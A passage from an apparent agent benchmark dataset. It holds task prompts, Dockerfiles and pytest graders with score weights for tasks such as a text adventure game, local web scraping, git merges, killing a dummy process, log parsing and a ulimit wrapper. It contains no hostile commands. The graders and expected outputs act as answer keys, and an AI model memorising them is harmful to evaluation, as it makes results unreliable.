RUN echo '#!/bin/bash' > /app/adventure && \
    echo '# Adventure Game - Navigate rooms, find key, unlock door, get treasure' >> /app/adventure && \
    echo 'current_room=""forest""' >> /app/adventure && \
    echo 'has_key=false' >> /app/adventure && \
    echo 'door_unlocked=false' >> /app/adventure && \
    echo 'has_treasure=false' >> /app/adventure && \
    echo '' >> /app/adventure && \
    echo 'echo ""Welcome to the Adventure Game!""' >> /app/adventure && \
    echo 'echo ""Navigate through rooms, find a key, unlock a door, and retrieve the treasure to win!""' >> /app/adventure && \
    echo 'echo ""Commands: look, go [direction], get [item], use [item] on [object], quit""' >> /app/adventure && \
    echo '' >> /app/adventure && \
    echo 'while true; do' >> /app/adventure && \
    echo '    read -r input' >> /app/adventure && \
    echo '    command=$(echo ""$input"" | cut -d"" "" -f1)' >> /app/adventure && \
    echo '    arg1=$(echo ""$input"" | cut -d"" "" -f2)' >> /app/adventure && \
    echo '    arg2=$(echo ""$input"" | cut -d"" "" -f3)' >> /app/adventure && \
    echo '    arg3=$(echo ""$input"" | cut -d"" "" -f4)' >> /app/adventure && \
    echo '    arg4=$(echo ""$input"" | cut -d"" "" -f5)' >> /app/adventure && \
    echo '    ' >> /app/adventure && \
    echo '    case $command in' >> /app/adventure && \
    echo '        look)' >> /app/adventure && \
    echo '            case $current_room in' >> /app/adventure && \
    echo '                forest)' >> /app/adventure && \
    echo '                    echo ""You are in a dark forest. There is a path to the east.""' >> /app/adventure && \
    echo '                    if ! $has_key; then' >> /app/adventure && \
    echo '                        echo ""You see a shiny key on the ground.""' >> /app/adventure && \
    echo '                    fi' >> /app/adventure && \
    echo '                    ;;' >> /app/adventure && \
    echo '                clearing)' >> /app/adventure && \
    echo '                    echo ""You are in a small clearing. There is a path to the west and a locked door to the north.""' >> /app/adventure && \
    echo '                    if $door_unlocked; then' >> /app/adventure && \
    echo '                        echo ""The door is now unlocked and open.""' >> /app/adventure && \
    echo '                    fi' >> /app/adventure && \
    echo '                    ;;' >> /app/adventure && \
    echo '                treasure_room)' >> /app/adventure && \
    echo '                    echo ""You are in a treasure room! There is a path to the south.""' >> /app/adventure && \
    echo '                    if ! $has_treasure; then' >> /app/adventure && \
    echo '                        echo ""You see a magnificent treasure chest!""' >> /app/adventure && \
    echo '                    fi' >> /app/adventure && \
    echo '                    ;;' >> /app/adventure && \
    echo '            esac' >> /app/adventure && \
    echo '            ;;' >> /app/adventure && \
    echo '        go)' >> /app/adventure && \
    echo '            case $arg1 in' >> /app/adventure && \
    echo '                east)' >> /app/adventure && \
    echo '                    if [ ""$current_room"" = ""forest"" ]; then' >> /app/adventure && \
    echo '                        current_room=""clearing""' >> /app/adventure && \
    echo '                        echo ""You walk east to a clearing.""' >> /app/adventure && \
    echo '                    else' >> /app/adventure && \
    echo '                        echo ""You cannot go east from here.""' >> /app/adventure && \
    echo '                    fi' >> /app/adventure && \
    echo '                    ;;' >> /app/adventure && \
    echo '                west)' >> /app/adventure && \
    echo '                    if [ ""$current_room"" = ""clearing"" ]; then' >> /app/adventure && \
    echo '                        current_room=""forest""' >> /app/adventure && \
    echo '                        echo ""You walk west back to the forest.""' >> /app/adventure && \
    echo '                    else' >> /app/adventure && \
    echo '                        echo ""You cannot go west from here.""' >> /app/adventure && \
    echo '                    fi' >> /app/adventure && \
    echo '                    ;;' >> /app/adventure && \
    echo '                north)' >> /app/adventure && \
    echo '                    if [ ""$current_room"" = ""clearing"" ] && $door_unlocked; then' >> /app/adventure && \
    echo '                        current_room=""treasure_room""' >> /app/adventure && \
    echo '                        echo ""You walk through the open door to the north.""' >> /app/adventure && \
    echo '                    elif [ ""$current_room"" = ""clearing"" ]; then' >> /app/adventure && \
    echo '                        echo ""The door is locked. You need to unlock it first.""' >> /app/adventure && \
    echo '                    else' >> /app/adventure && \
    echo '                        echo ""You cannot go north from here.""' >> /app/adventure && \
    echo '                    fi' >> /app/adventure && \
    echo '                    ;;' >> /app/adventure && \
    echo '                south)' >> /app/adventure && \
    echo '                    if [ ""$current_room"" = ""treasure_room"" ]; then' >> /app/adventure && \
    echo '                        current_room=""clearing""' >> /app/adventure && \
    echo '                        echo ""You walk south back to the clearing.""' >> /app/adventure && \
    echo '                    else' >> /app/adventure && \
    echo '                        echo ""You cannot go south from here.""' >> /app/adventure && \
    echo '                    fi' >> /app/adventure && \
    echo '                    ;;' >> /app/adventure && \
    echo '                *)' >> /app/adventure && \
    echo '                    echo ""You cannot go that direction.""' >> /app/adventure && \
    echo '                    ;;' >> /app/adventure && \
    echo '            esac' >> /app/adventure && \
    echo '            ;;' >> /app/adventure && \
    echo '        get)' >> /app/adventure && \
    echo '            case $arg1 in' >> /app/adventure && \
    echo '                key)' >> /app/adventure && \
    echo '                    if [ ""$current_room"" = ""forest"" ] && ! $has_key; then' >> /app/adventure && \
    echo '                        has_key=true' >> /app/adventure && \
    echo '                        echo ""You pick up the key.""' >> /app/adventure && \
    echo '                    elif $has_key; then' >> /app/adventure && \
    echo '                        echo ""You already have the key.""' >> /app/adventure && \
    echo '                    else' >> /app/adventure && \
    echo '                        echo ""There is no key here.""' >> /app/adventure && \
    echo '                    fi' >> /app/adventure && \
    echo '                    ;;' >> /app/adventure && \
    echo '                treasure)' >> /app/adventure && \
    echo '                    if [ ""$current_room"" = ""treasure_room"" ] && ! $has_treasure; then' >> /app/adventure && \
    echo '                        has_treasure=true' >> /app/adventure && \
    echo '                        echo ""You take the treasure!""' >> /app/adventure && \
    echo '                        echo ""You win!""' >> /app/adventure && \
    echo '                        exit 0' >> /app/adventure && \
    echo '                    elif $has_treasure; then' >> /app/adventure && \
    echo '                        echo ""You already have the treasure.""' >> /app/adventure && \
    echo '                    else' >> /app/adventure && \
    echo '                        echo ""There is no treasure here.""' >> /app/adventure && \
    echo '                    fi' >> /app/adventure && \
    echo '                    ;;' >> /app/adventure && \
    echo '                *)' >> /app/adventure && \
    echo '                    echo ""You cannot get that item.""' >> /app/adventure && \
    echo '                    ;;' >> /app/adventure && \
    echo '            esac' >> /app/adventure && \
    echo '            ;;' >> /app/adventure && \
    echo '        use)' >> /app/adventure && \
    echo '            if [ ""$arg1"" = ""key"" ] && [ ""$arg2"" = ""on"" ] && [ ""$arg3"" = ""door"" ]; then' >> /app/adventure && \
    echo '                if [ ""$current_room"" = ""clearing"" ] && $has_key && ! $door_unlocked; then' >> /app/adventure && \
    echo '                    door_unlocked=true' >> /app/adventure && \
    echo '                    echo ""You use the key to unlock the door. It swings open!""' >> /app/adventure && \
    echo '                elif ! $has_key; then' >> /app/adventure && \
    echo '                    echo ""You do not have a key.""' >> /app/adventure && \
    echo '                elif $door_unlocked; then' >> /app/adventure && \
    echo '                    echo ""The door is already unlocked.""' >> /app/adventure && \
    echo '                else' >> /app/adventure && \
    echo '                    echo ""There is no door here to unlock.""' >> /app/adventure && \
    echo '                fi' >> /app/adventure && \
    echo '            else' >> /app/adventure && \
    echo '                echo ""Invalid use command. Try: use key on door""' >> /app/adventure && \
    echo '            fi' >> /app/adventure && \
    echo '            ;;' >> /app/adventure && \
    echo '        quit)' >> /app/adventure && \
    echo '            echo ""Thanks for playing!""' >> /app/adventure && \
    echo '            exit 0' >> /app/adventure && \
    echo '            ;;' >> /app/adventure && \
    echo '        *)' >> /app/adventure && \
    echo '            echo ""Unknown command. Available commands: look, go [direction], get [item], use [item] on [object], quit""' >> /app/adventure && \
    echo '            ;;' >> /app/adventure && \
    echo '    esac' >> /app/adventure && \
    echo 'done' >> /app/adventure

RUN chmod +x /app/adventure

CMD [""/bin/bash""]","import os
import subprocess

def test_commands_file_created():
    """"""File `/app/commands.txt` is created.""""""
    assert os.path.exists(""/app/commands.txt"")

def test_game_winning_sequence():
    """"""The sequence of commands in the file, when piped to the game (`cat /app/commands.txt | /app/adventure`), successfully completes the game.""""""
    # First check if the commands file exists
    assert os.path.exists(""/app/commands.txt"")
    
    # Run the game with the commands piped to it
    result = subprocess.run(
        ""cat /app/commands.txt | /app/adventure"",
        shell=True,
        capture_output=True,
        text=True
    )
    
    # Check that ""You win!"" appears in the output
    assert ""You win!"" in result.stdout","{""test_commands_file_created"": 0.15, ""test_game_winning_sequence"": 0.85}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
web-scraping-single-page-title,easy,Scrape a Single Web Page Title,Web Scraping & Information Retrieval,"I have a simple web server running on localhost:8000 and I need you to fetch the HTML from the main page. Once you get that, can you extract the text from the title tag and write it to a file at /app/title.txt? I just need the actual title text saved there.",file-operations,web-scraping|information-retrieval|text-processing|file-operations,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN echo '<!DOCTYPE html><html><head><title>Test Page</title></head><body><h1>Hello World</h1></body></html>' > index.html

EXPOSE 8000

CMD [""/bin/bash""]","import os
import subprocess

def test_curl_fetches_page():
    """"""The agent uses a tool like `curl` to fetch the page content.""""""
    # Test that curl can successfully fetch the page from localhost:8000
    result = subprocess.run(['curl', '-s', 'http://localhost:8000'], 
                          capture_output=True, text=True)
    assert result.returncode == 0
    assert 'Test Page' in result.stdout

def test_title_file_created():
    """"""The file `/app/title.txt` is created and contains only the text from the title tag.""""""
    assert os.path.exists('/app/title.txt')
    with open('/app/title.txt', 'r') as f:
        content = f.read().strip()
    assert content == 'Test Page'","{""test_curl_fetches_page"": 0.3, ""test_title_file_created"": 0.7}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
web-scraping-table-to-csv,medium,Scrape Tabular Data into a CSV,Web Scraping & Information Retrieval,I have a web page running at http://localhost:8000/data that contains an HTML table with some data I need to extract. Could you help me write a Python script at /app/scrape_table.py that will scrape this table and save all the contents to a CSV file at /app/data.csv? I want to make sure the CSV includes the table headers as well.,file-operations,web-scraping|data-extraction|python|data-processing,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

RUN pip install requests beautifulsoup4

# Create the /app directory for the agent's work
RUN mkdir -p /app

# Set up the web server content in /var/www
WORKDIR /var/www

RUN echo '<!DOCTYPE html>\
<html>\
<head>\
    <title>Web Server Page</title>\
</head>\
<body>\
    <h1>Web Server Page</h1>\
    <table border=""1"">\
        <tr>\
            <th>Column 1</th>\
            <th>Column 2</th>\
        </tr>\
        <tr>\
            <td>Data 1</td>\
            <td>Data 2</td>\
        </tr>\
    </table>\
</body>\
</html>' > index.html

RUN echo '<!DOCTYPE html>\
<html>\
<head>\
    <title>Data Page</title>\
</head>\
<body>\
    <h1>Data Page</h1>\
    <table border=""1"">\
        <tr>\
            <th>Column 1</th>\
            <th>Column 2</th>\
        </tr>\
        <tr>\
            <td>Data 1</td>\
            <td>Data 2</td>\
        </tr>\
    </table>\
</body>\
</html>' > data

# Change to /app for the agent to work in
WORKDIR /app

EXPOSE 8000

# Start the web server from /var/www
CMD [""python3"", ""-m"", ""http.server"", ""8000"", ""--directory"", ""/var/www""]","import os
import csv

def test_script_exists():
    """"""Script `scrape_table.py` exists.""""""
    assert os.path.exists(""/app/scrape_table.py"")

def test_csv_file_created():
    """"""File `/app/data.csv` is created.""""""
    assert os.path.exists(""/app/data.csv"")

def test_table_data_matches():
    """"""The content of `data.csv` accurately matches the data and headers from the HTML table.""""""
    with open(""/app/data.csv"", ""r"") as f:
        reader = csv.reader(f)
        rows = list(reader)
    
    # Check that we have at least 2 rows (header + data)
    assert len(rows) >= 2
    
    # Check headers match
    assert rows[0] == [""Column 1"", ""Column 2""]
    
    # Check data row matches
    assert rows[1] == [""Data 1"", ""Data 2""]","{""test_script_exists"": 0.15, ""test_csv_file_created"": 0.25, ""test_table_data_matches"": 0.60}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
web-scraping-pagination-product-data,hard,Scrape Data from Multiple Pages (Pagination),Web Scraping & Information Retrieval,"I need help creating a web scraping script to collect product data from a mock e-commerce site I'm running locally. The site is at `http://localhost:8000/products_1.html` and has products spread across multiple pages. Each page has a ""Next Page"" link in an `<a>` tag with the class `next-link` that points to the next page like `/products_2.html`, and the last page doesn't have this link. Could you write me a script called `scrape_all.py` that will follow all these ""Next Page"" links to scrape the names of every product from every page, then save all the product names to `/app/products.txt` with one name per line?",software-engineering,web-scraping|python|data-extraction|information-retrieval,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

# Install required Python packages
RUN pip install requests beautifulsoup4

# Create app directory for the agent's work
RUN mkdir -p /app

# Create web content directory
RUN mkdir -p /var/www/html

# Create main index page
RUN echo '<!DOCTYPE html>\n<html>\n<head><title>E-commerce Site</title></head>\n<body>\n<h1>Welcome to Our Store</h1>\n<p><a href=""products_1.html"">Browse Products</a></p>\n</body>\n</html>' > /var/www/html/index.html

# Create paginated product pages
RUN echo '<!DOCTYPE html>\n<html>\n<head><title>Products - Page 1</title></head>\n<body>\n<h1>Products - Page 1</h1>\n<div class=""products"">\n<div class=""product"">\n<h3>Wireless Headphones</h3>\n<p class=""price"">$79.99</p>\n<p class=""description"">High-quality wireless headphones with noise cancellation</p>\n</div>\n<div class=""product"">\n<h3>Smartphone Case</h3>\n<p class=""price"">$24.99</p>\n<p class=""description"">Durable protective case for smartphones</p>\n</div>\n<div class=""product"">\n<h3>Bluetooth Speaker</h3>\n<p class=""price"">$49.99</p>\n<p class=""description"">Portable bluetooth speaker with excellent sound quality</p>\n</div>\n<div class=""product"">\n<h3>USB Cable</h3>\n<p class=""price"">$12.99</p>\n<p class=""description"">High-speed USB-C charging cable</p>\n</div>\n<div class=""product"">\n<h3>Power Bank</h3>\n<p class=""price"">$34.99</p>\n<p class=""description"">10000mAh portable power bank</p>\n</div>\n</div>\n<div class=""pagination"">\n<a class=""next-link"" href=""products_2.html"">Next Page</a>\n</div>\n</body>\n</html>' > /var/www/html/products_1.html

RUN echo '<!DOCTYPE html>\n<html>\n<head><title>Products - Page 2</title></head>\n<body>\n<h1>Products - Page 2</h1>\n<div class=""products"">\n<div class=""product"">\n<h3>Laptop Stand</h3>\n<p class=""price"">$39.99</p>\n<p class=""description"">Adjustable aluminum laptop stand</p>\n</div>\n<div class=""product"">\n<h3>Wireless Mouse</h3>\n<p class=""price"">$29.99</p>\n<p class=""description"">Ergonomic wireless mouse with precision tracking</p>\n</div>\n<div class=""product"">\n<h3>Keyboard</h3>\n<p class=""price"">$89.99</p>\n<p class=""description"">Mechanical keyboard with RGB backlighting</p>\n</div>\n<div class=""product"">\n<h3>Monitor</h3>\n<p class=""price"">$199.99</p>\n<p class=""description"">24-inch Full HD monitor with IPS panel</p>\n</div>\n<div class=""product"">\n<h3>Webcam</h3>\n<p class=""price"">$59.99</p>\n<p class=""description"">1080p HD webcam with built-in microphone</p>\n</div>\n</div>\n<div class=""pagination"">\n<a href=""products_1.html"">Previous Page</a> | \n<a class=""next-link"" href=""products_3.html"">Next Page</a>\n</div>\n</body>\n</html>' > /var/www/html/products_2.html

RUN echo '<!DOCTYPE html>\n<html>\n<head><title>Products - Page 3</title></head>\n<body>\n<h1>Products - Page 3</h1>\n<div class=""products"">\n<div class=""product"">\n<h3>Gaming Chair</h3>\n<p class=""price"">$249.99</p>\n<p class=""description"">Ergonomic gaming chair with lumbar support</p>\n</div>\n<div class=""product"">\n<h3>Desk Lamp</h3>\n<p class=""price"">$45.99</p>\n<p class=""description"">LED desk lamp with adjustable brightness</p>\n</div>\n<div class=""product"">\n<h3>Coffee Mug</h3>\n<p class=""price"">$14.99</p>\n<p class=""description"">Ceramic coffee mug with heat-resistant handle</p>\n</div>\n<div class=""product"">\n<h3>Notebook</h3>\n<p class=""price"">$8.99</p>\n<p class=""description"">Premium lined notebook with hardcover</p>\n</div>\n<div class=""product"">\n<h3>Pen Set</h3>\n<p class=""price"">$19.99</p>\n<p class=""description"">Professional ballpoint pen set</p>\n</div>\n</div>\n<div class=""pagination"">\n<a href=""products_2.html"">Previous Page</a> | \n<a class=""next-link"" href=""products_4.html"">Next Page</a>\n</div>\n</body>\n</html>' > /var/www/html/products_3.html

RUN echo '<!DOCTYPE html>\n<html>\n<head><title>Products - Page 4</title></head>\n<body>\n<h1>Products - Page 4</h1>\n<div class=""products"">\n<div class=""product"">\n<h3>Water Bottle</h3>\n<p class=""price"">$22.99</p>\n<p class=""description"">Stainless steel insulated water bottle</p>\n</div>\n<div class=""product"">\n<h3>Backpack</h3>\n<p class=""price"">$69.99</p>\n<p class=""description"">Durable laptop backpack with multiple compartments</p>\n</div>\n<div class=""product"">\n<h3>Phone Charger</h3>\n<p class=""price"">$18.99</p>\n<p class=""description"">Fast wireless phone charger</p>\n</div>\n<div class=""product"">\n<h3>Tablet Stand</h3>\n<p class=""price"">$25.99</p>\n<p class=""description"">Adjustable tablet stand for desk use</p>\n</div>\n</div>\n<div class=""pagination"">\n<a href=""products_3.html"">Previous Page</a>\n</div>\n</body>\n</html>' > /var/www/html/products_4.html

# Set working directory to /app for the agent
WORKDIR /app

# Start the web server from /var/www/html
CMD [""python3"", ""-m"", ""http.server"", ""8000"", ""--directory"", ""/var/www/html""]","import os

def test_script_exists():
    """"""Script `scrape_all.py` exists.""""""
    assert os.path.exists(""scrape_all.py"")

def test_output_file_created():
    """"""File `/app/products.txt` is created.""""""
    assert os.path.exists(""/app/products.txt"")

def test_complete_product_list():
    """"""The `products.txt` file contains the complete list of product names from all pages.""""""
    expected_products = {
        ""Wireless Headphones"", ""Smartphone Case"", ""Bluetooth Speaker"", ""USB Cable"", ""Power Bank"",
        ""Laptop Stand"", ""Wireless Mouse"", ""Keyboard"", ""Monitor"", ""Webcam"",
        ""Gaming Chair"", ""Desk Lamp"", ""Coffee Mug"", ""Notebook"", ""Pen Set"",
        ""Water Bottle"", ""Backpack"", ""Phone Charger"", ""Tablet Stand""
    }
    
    with open(""/app/products.txt"", ""r"") as f:
        content = f.read().strip()
        product_lines = [line.strip() for line in content.split('\n') if line.strip()]
    
    found_products = set(product_lines)
    assert expected_products.issubset(found_products)","{""test_script_exists"": 0.1, ""test_output_file_created"": 0.15, ""test_complete_product_list"": 0.75}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
version-control-create-commit,easy,Create a Commit,Version Control (`git`),I've created a new file called README.md in my git repository located at /app/my_project. Can you help me add this file to staging and then create a commit with the message 'Add README file'?,software-engineering,version-control|git,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN apt-get update && apt-get install -y git

RUN git config --global user.name ""Test User"" && git config --global user.email ""test@example.com""

WORKDIR /app/my_project

RUN git init

RUN touch README.md

CMD [""/bin/bash""]","import os
import subprocess

def test_file_staged():
    """"""The `README.md` file is added to the git index.""""""
    os.chdir('/app/my_project')
    result = subprocess.run(['git', 'ls-files', 'README.md'], 
                          capture_output=True, text=True)
    assert result.returncode == 0
    assert 'README.md' in result.stdout

def test_commit_created():
    """"""A new commit is created with the specified message, and `git status` shows a clean working tree.Total: 1.0""""""
    os.chdir('/app/my_project')
    
    # Check if a commit exists with the message 'Add README file'
    result = subprocess.run(['git', 'log', '--oneline', '-1'], 
                          capture_output=True, text=True)
    assert result.returncode == 0
    assert 'Add README file' in result.stdout
    
    # Check if git status shows a clean working tree
    result = subprocess.run(['git', 'status', '--porcelain'], 
                          capture_output=True, text=True)
    assert result.returncode == 0
    assert result.stdout.strip() == """"","{""test_file_staged"": 0.4, ""test_commit_created"": 0.6}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
version-control-feature-branch-merge,medium,Create and Merge a Feature Branch,Version Control (`git`),"I need you to help me work on a new feature in my repository located at `/app/my_project`. Can you create a new branch called `feature/add-login` for me? Once you've done that, I'd like you to create a new file named `login.py` on that branch and commit it. After that's complete, please merge the `feature/add-login` branch back into the `main` branch.",software-engineering,version-control|software-engineering,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN apt-get update && apt-get install -y git

WORKDIR /app/my_project

RUN git init && \
    git config user.name ""Test User"" && \
    git config user.email ""test@example.com"" && \
    touch README.md && \
    git add README.md && \
    git commit -m ""Initial commit""

CMD [""/bin/bash""]","import os
import subprocess

def test_feature_branch_created():
    """"""A new branch `feature/add-login` is created.""""""
    os.chdir('/app/my_project')
    # Save current branch
    current_branch = subprocess.run(['git', 'rev-parse', '--abbrev-ref', 'HEAD'], capture_output=True, text=True).stdout.strip()
    
    try:
        result = subprocess.run(['git', 'branch', '-a'], capture_output=True, text=True)
        assert 'feature/add-login' in result.stdout
    finally:
        # Restore current branch
        subprocess.run(['git', 'checkout', current_branch], capture_output=True, text=True)

def test_login_file_committed():
    """"""A new commit containing `login.py` exists on the `feature/add-login` branch.""""""
    os.chdir('/app/my_project')
    # Save current branch
    current_branch = subprocess.run(['git', 'rev-parse', '--abbrev-ref', 'HEAD'], capture_output=True, text=True).stdout.strip()
    
    try:
        subprocess.run(['git', 'checkout', 'feature/add-login'], capture_output=True, text=True)
        result = subprocess.run(['git', 'ls-files'], capture_output=True, text=True)
        assert 'login.py' in result.stdout
    finally:
        # Restore current branch
        subprocess.run(['git', 'checkout', current_branch], capture_output=True, text=True)

def test_feature_branch_merged():
    """"""The `main` branch's history shows a merge commit from the feature branch, and the `login.py` file is present on `main`.Total: 1.0""""""
    os.chdir('/app/my_project')
    # Save current branch
    current_branch = subprocess.run(['git', 'rev-parse', '--abbrev-ref', 'HEAD'], capture_output=True, text=True).stdout.strip()
    
    try:
        subprocess.run(['git', 'checkout', 'main'], capture_output=True, text=True)
        # Check if login.py is present on main
        result = subprocess.run(['git', 'ls-files'], capture_output=True, text=True)
        assert 'login.py' in result.stdout
        
        # Check if feature branch has been merged (accept both merge commits and fast-forward)
        merge_result = subprocess.run(['git', 'merge-base', '--is-ancestor', 'feature/add-login', 'main'], capture_output=True, text=True)
        assert merge_result.returncode == 0
    finally:
        # Restore current branch
        subprocess.run(['git', 'checkout', current_branch], capture_output=True, text=True)","{""test_feature_branch_created"": 0.25, ""test_login_file_committed"": 0.35, ""test_feature_branch_merged"": 0.40}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
version-control-merge-conflict-resolution,hard,Resolve a Merge Conflict,Version Control (`git`),"I'm having trouble with a Git merge in my repository at `/app/my_project`. I was trying to merge the `dev` branch into `main`, but I ran into a merge conflict in the `config.json` file. Can you help me resolve this conflict? For the conflicting section, I want to keep the version from the `main` branch, and then complete the merge once that's sorted out.",software-engineering,version-control|debugging|file-operations,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN apt-get update && apt-get install -y git

WORKDIR /app

RUN mkdir my_project
WORKDIR /app/my_project
RUN git init

RUN git config user.name ""Test User"" && git config user.email ""test@example.com""

# Rename master to main
RUN git branch -m main

RUN echo '{\n  ""database"": {\n    ""host"": ""localhost"",\n    ""port"": 5432\n  }\n}' > config.json
RUN git add config.json
RUN git commit -m ""Initial config""

RUN git checkout -b dev
RUN echo '{\n  ""database"": {\n    ""host"": ""dev-server"",\n    ""port"": 3306\n  }\n}' > config.json
RUN git add config.json
RUN git commit -m ""Update config for dev environment""

RUN git checkout main
RUN echo '{\n  ""database"": {\n    ""host"": ""prod-server"",\n    ""port"": 5432\n  }\n}' > config.json
RUN git add config.json
RUN git commit -m ""Update config for production""

RUN git merge dev || true

CMD [""/bin/bash""]","import os
import subprocess
import json

def test_config_conflict_resolved():
    """"""The `config.json` file is edited to resolve the conflict markers, keeping the version from `main`.""""""
    config_path = ""/app/my_project/config.json""
    
    # Check file exists
    assert os.path.exists(config_path)
    
    # Read the file content
    with open(config_path, 'r') as f:
        content = f.read()
    
    # Check no conflict markers remain
    assert ""<<<<<<< HEAD"" not in content
    assert ""======="" not in content  
    assert "">>>>>>> dev"" not in content
    
    # Parse JSON and check it matches main branch version (prod-server:5432)
    config = json.loads(content)
    assert config[""database""][""host""] == ""prod-server""
    assert config[""database""][""port""] == 5432

def test_merge_completed_clean():
    """"""The merge is successfully completed, a merge commit is created, and `git status` shows a clean working tree.Total: 1.0""""""
    original_cwd = os.getcwd()
    try:
        os.chdir(""/app/my_project"")
        
        # Check git status shows clean working tree
        result = subprocess.run([""git"", ""status"", ""--porcelain""], capture_output=True, text=True)
        assert result.stdout.strip() == """"
        
        # Check that we're not in the middle of a merge
        result = subprocess.run([""git"", ""status""], capture_output=True, text=True)
        assert ""You have unmerged paths"" not in result.stdout
        assert ""All conflicts fixed but you are still merging"" not in result.stdout
        
        # Check that a commit was created and merge is complete (supports different merge strategies)
        result = subprocess.run([""git"", ""log"", ""--pretty=format:%P"", ""-1""], capture_output=True, text=True)
        parents = result.stdout.strip().split()
        assert len(parents) >= 1  # At least one parent indicates a commit exists
        
        # Additional check: ensure merge state is clean
        result = subprocess.run([""git"", ""rev-parse"", ""--verify"", ""HEAD""], capture_output=True, text=True)
        assert result.returncode == 0  # HEAD exists and is valid
        
    finally:
        os.chdir(original_cwd)","{""test_config_conflict_resolved"": 0.40, ""test_merge_completed_clean"": 0.60}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
system-find-kill-process,easy,Find and Kill a Process,System & Process Management (Revised),I have a runaway process on my system called `rogue_process` that's causing problems. Can you help me find its PID and terminate it? I need to get this process stopped as soon as possible.,system-administration,sys-admin|system|cli,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN echo '#!/bin/bash\nwhile true; do\n    sleep 1\ndone' > /usr/local/bin/rogue_process && \
    chmod +x /usr/local/bin/rogue_process

CMD /usr/local/bin/rogue_process & sleep infinity","import os
import subprocess
import time

def test_uses_process_finder():
    """"""The agent uses a tool like `ps` or `pgrep` to find the process.""""""
    # Check that ps command is available and functional
    result_ps = subprocess.run(['ps', '--version'], capture_output=True, text=True)
    ps_available = result_ps.returncode == 0
    
    # Check that pgrep command is available and functional  
    result_pgrep = subprocess.run(['pgrep', '--version'], capture_output=True, text=True)
    pgrep_available = result_pgrep.returncode == 0
    
    # At least one of these process finder tools should be available
    assert ps_available or pgrep_available

def test_process_terminated():
    """"""The `rogue_process` is no longer running.""""""
    # Add small delay to ensure process termination is complete
    time.sleep(2)
    
    # Use pgrep to check if rogue_process is running
    result = subprocess.run(['pgrep', '-f', 'rogue_process'], capture_output=True, text=True)
    
    # If pgrep returns non-zero exit code, no matching processes were found
    assert result.returncode != 0","{""test_uses_process_finder"": 0.20, ""test_process_terminated"": 0.80}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
log-processing-after-marker,medium,Process a Log File After a Marker (Revised),System & Process Management (Revised),"I have a service that's been writing to a log file at `/var/log/app.log`, and I need your help creating a script called `process_log.sh`. What I want this script to do is find the first line in the log that contains exactly the message ""SERVICE_READY"", and then take all the lines that come after that point and write them to a new file at `/app/processed_events.txt`. If ""SERVICE_READY"" appears multiple times in the log, I only want to process from the very first occurrence. Can you help me write this script?",system-administration,cli|file-operations|text-processing|sys-admin,"FROM ghcr.io/laude-institute/t-bench/ubuntu-24-04:latest

RUN mkdir -p /app

RUN echo -e ""[2024-01-01 10:00:00] Starting application...\n[2024-01-01 10:00:01] Initializing components...\n[2024-01-01 10:00:02] SERVICE_READY\n[2024-01-01 10:00:03] Application running normally..."" > /var/log/app.log

WORKDIR /app

CMD [""/bin/bash""]","import os
import subprocess

def test_script_created_executable():
    """"""An executable script `process_log.sh` is created that uses a tool like `awk` or `sed`.""""""
    # Check if the script exists
    assert os.path.exists(""process_log.sh"")
    
    # Check if the script is executable
    assert os.access(""process_log.sh"", os.X_OK)

def test_processed_file_correct_content():
    """"""The file `/app/processed_events.txt` is created and contains exactly the lines from the log that appeared after the ""SERVICE_READY"" marker.""""""
    # Check if the processed file exists
    assert os.path.exists(""/app/processed_events.txt"")
    
    # Read the processed file content
    with open(""/app/processed_events.txt"", ""r"") as f:
        processed_content = f.read().strip()
    
    # Expected content is everything after the SERVICE_READY line
    expected_content = ""[2024-01-01 10:00:03] Application running normally...""
    
    assert processed_content == expected_content","{""test_script_created_executable"": 0.3, ""test_processed_file_correct_content"": 0.7}",{},2025-07-22T10:02:46.844265+00:00,2025-07-22T10:02:46.844265+00:00
system-process-resource-limits,hard,Run a Process with Resource Limits,System & Process Management (Revised),"I have a Python script located at `/app/memory_eater.py` that I need to run, but I'm worried it might consume too much memory on my system. Could you help me create a wrapper shell script called `run_limited.sh` that uses the `ulimit` command to set a virtual memory limit of 100 megabytes (which is 102400 kilobytes) before it executes the Python script? I want to make sure the script can't go over that memory threshold.",system-administration,system|sys-admin|cli|python|performance-optimization,"FROM ghcr.io/laude-institute/t-bench/python-3-13:20250620

WORKDIR /app

RUN echo ""# Allocate more than 100MB of memory\ndata = 'x' * (120 * 1024 * 1024)  # 120MB to account for Python interpreter overhead\nprint(f'Allocated {len(data)} bytes')"" > /app/memory_eater.py

CMD [""/bin/bash""]","import os
import subprocess

def test_script_created_with_ulimit():
    """"""An executable script `run_limited.sh` is created and contains the correct `ulimit -v 102400` command followed by the `python3 /app/memory_eater.py` command.""""""
    # Check if the script exists
    assert os.path.exists(""run_limited.sh"")
    
    # Check if the script is executable
    assert os.access(""run_limited.sh"", os.X_OK)
    
    # Read the script content
    with open(""run_limited.sh"", ""r"") as f:
        content = f.read()
    
    # Check if it contains the ulimit command
    assert ""ulimit -v 102400"" in content
    
    # Check if it contains the python command
    assert ""python3 /app/memory_eater.py"" in content

def test_memory_limit_enforced():
    """"""When the verifier runs `bash run_limited.sh`, the script exits with a non-zero status code, and its stderr contains a ""Killed"" or ""Memory limit exceeded"" message, proving the limit was successfully enforced.Total: 1.0""""""
    # Run the script and capture output
    result = subprocess.run([""bash"", ""run_limited.sh""], capture_output=True, text=True)
    
    # Check that the script exits with non-zero status code
    assert result.returncode != 0
    
    # Check stderr and stdout for memory-related error messages
    combined_output = (result.stderr + result.stdout).lower()
    
